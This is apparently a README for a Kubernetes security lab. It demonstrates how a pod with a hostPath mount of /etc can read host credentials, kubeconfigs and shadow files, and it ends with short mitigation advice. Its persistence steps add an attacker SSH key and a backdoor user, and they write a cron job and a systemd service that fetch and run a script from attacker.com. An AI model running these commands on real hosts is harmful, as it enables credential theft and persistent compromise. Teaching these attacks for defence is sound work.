# HostPath Mount Pivoting

This example shows how mounting host paths into a container can allow an attacker to access sensitive files and potentially compromise the host and cluster.

## Attack Scenario
- The pod uses the public.aws.ecr/docker/library/alpine:3.22 image.
- The container mounts `/etc` from the host using `hostPath`.
- Attacker can read/modify host configuration files.

## Deployment
```bash
# Deploy the pod
make apply
# or
kubectl apply -f pod.yaml

# Wait for the pod to be running
kubectl get pod hostpath-alpine
```

## Attack Demonstration Commands

### 1. Access Host System Files
```bash
# Exec into the pod
kubectl exec -it hostpath-alpine -- sh

# List mounted host directories
ls -la /host-etc/

# View host system information
cat /host-etc/os-release
cat /host-etc/hostname
cat /host-etc/hosts
```

### 2. Extract Sensitive Configuration Files
```bash
# Read host user accounts
cat /host-etc/passwd
cat /host-etc/group

# Look for shadow passwords (if accessible)
ls -la /host-etc/shadow
cat /host-etc/shadow 2>/dev/null || echo "Shadow file not accessible"

# View sudoers configuration
cat /host-etc/sudoers
cat /host-etc/sudoers.d/*

# Check for SSH configuration
ls -la /host-etc/ssh/
cat /host-etc/ssh/sshd_config
```

### 3. Access Network Configuration
```bash
# View network configuration
cat /host-etc/network/interfaces
cat /host-etc/sysconfig/network-scripts/ifcfg-*

# View DNS configuration
cat /host-etc/resolv.conf
cat /host-etc/hosts

# Check for firewall rules
cat /host-etc/iptables/rules.v4 2>/dev/null || echo "No iptables rules found"
```

### 4. Kubernetes Cluster Information
```bash
# Look for Kubernetes configuration
find /host-etc -name "*kube*" -type f 2>/dev/null

# Check for kubelet configuration
cat /host-etc/kubernetes/kubelet.conf 2>/dev/null || echo "Kubelet config not found"

# Look for cluster certificates
find /host-etc -name "*.crt" -o -name "*.pem" 2>/dev/null

# Check for admin kubeconfig
cat /host-etc/kubernetes/admin.conf 2>/dev/null || echo "Admin config not found"
```

### 5. Service Account and Token Discovery
```bash
# Look for service account tokens
find /host-etc -name "token" -type f 2>/dev/null

# Check for cloud provider credentials
ls -la /host-etc/cloud/
cat /host-etc/cloud/cloud.cfg 2>/dev/null || echo "Cloud config not found"

# Look for AWS credentials
cat /host-etc/aws/credentials 2>/dev/null || echo "AWS credentials not found"
```

### 6. Modify Host Configuration (Persistence)
```bash
# Add malicious SSH key to authorized_keys
mkdir -p /host-etc/ssh/
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC attacker@malicious" >> /host-etc/ssh/authorized_keys

# Add cron job for persistence
echo "* * * * * root /bin/bash -c 'curl http://attacker.com/backup.sh | bash'" >> /host-etc/crontab

# Modify hosts file for DNS hijacking
echo "malicious.com 192.168.1.100" >> /host-etc/hosts

# Add backdoor user
echo "backdoor:x:1001:1001:Backdoor User:/home/backdoor:/bin/bash" >> /host-etc/passwd
```

### 7. Container Runtime Information
```bash
# Look for container runtime configuration
ls -la /host-etc/docker/
cat /host-etc/docker/daemon.json 2>/dev/null || echo "Docker config not found"

# Check for CRI-O configuration
cat /host-etc/crio/crio.conf 2>/dev/null || echo "CRI-O config not found"

# Look for containerd configuration
cat /host-etc/containerd/config.toml 2>/dev/null || echo "Containerd config not found"
```

### 8. Systemd Service Manipulation
```bash
# List systemd services
ls -la /host-etc/systemd/system/

# Create malicious systemd service
cat > /host-etc/systemd/system/malicious.service << EOF
[Unit]
Description=Malicious Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'curl http://attacker.com/payload.sh | bash'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable the malicious service
systemctl enable malicious 2>/dev/null || echo "Cannot enable service from container"
```

## Verification Commands
```bash
# Verify the hostPath mount is working
kubectl exec hostpath-alpine -- ls -la /host-etc/

# Check if files were modified
kubectl exec hostpath-alpine -- tail -5 /host-etc/hosts
kubectl exec hostpath-alpine -- grep backdoor /host-etc/passwd
```

## Cleanup
```bash
# Remove the pod
make clean
# or
kubectl delete -f pod.yaml

# Exit the pod shell
exit

# Note: Any changes made to host files will persist after pod deletion!
# Manual cleanup of host files may be required.
```

## Mitigation
- Avoid using hostPath mounts unless absolutely necessary.
- Use read-only hostPath mounts when possible.
- Implement Pod Security Policies or Pod Security Admission to restrict hostPath usage.
- Monitor file system access and modifications on host nodes.
- Use volume types with better isolation (e.g., ConfigMaps, Secrets, PVCs).

## Files
- `pod.yaml`: Pod spec with hostPath mount.
- `Makefile`: Deploy/remove the example.
